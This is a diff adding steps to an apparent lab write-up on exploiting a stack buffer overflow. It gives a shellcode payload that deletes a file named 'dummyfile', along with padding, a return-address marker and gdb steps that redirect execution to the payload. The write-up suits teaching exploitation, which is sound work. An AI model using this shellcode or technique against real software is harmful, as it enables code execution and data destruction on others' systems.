@@ -52,9 +52,30 @@ string shell code have length = 37 bytes
 space length = 68 - 37 =  31 in this 68 are sum of (buf + EBP)
 and a string to recognize return address : '\xff\xff\xff\xff'
 So, we have prestring buffer: 
+('\xeb\x15\x31\xc0\xb0\x05\x04\x05\xbb\x7c\x80\x04\x08\xcd\x80\x31\xc0\xb0\x02\x2c\x01\xcd\x80\xe8\xe6\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65'+'A'*31+'\xff\xff\xff\xff')
+
+In `gdb`, we disassemble the `main` function to inspect the assembly code. We set a breakpoint at address `0x08048441`, and another breakpoint at address `0x0804846b`, which is where the program moves to after the conditional checks and string operations. This allows us to step through the program and examine its behavior at these specific points.
+![alt text](imgs/10.png)
+
+run the gdb with payload: 
 r $(python -c "print('\xeb\x15\x31\xc0\xb0\x05\x04\x05\xbb\x7c\x80\x04\x08\xcd\x80\x31\xc0\xb0\x02\x2c\x01\xcd\x80\xe8\xe6\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65'+'A'*31+'\xff\xff\xff\xff')")
 
+After running the program with the above payload, we observe that the buffer region now contains the shellcode values. The EBP has been overwritten with the letter 'A', and in the 4 bytes of the return address, we see the string '\xff\xff\xff\xff', which we use for identification.
+![alt text](imgs/11.png)
 
+Setting the value 0x00 after the shellcode marks the end of the shellcode, ensuring that execution does not continue into unintended memory regions
 
+![alt text](imgs/12.png)
 
+Modify the _filename ‘dummyfile’ adresss to appropriate address in buffer. This modification ensures that the value at 0xffffd6c1 now correctly points to the address of the "dummyfile" string in memory, allowing the program or shellcode to properly access the filename during execution.
 
+![alt text](imgs/13.png)
+
+and Set return address to the ESP address:
+
+![alt text](imgs/14.png)
+
+Create the dummyfile, and then use the c command to continue the program in GDB. At this point, we see that the shellcode has successfully executed, and the dummyfile has been deleted.
+
+![alt text](imgs/15.png)
+![alt text](imgs/16.png)
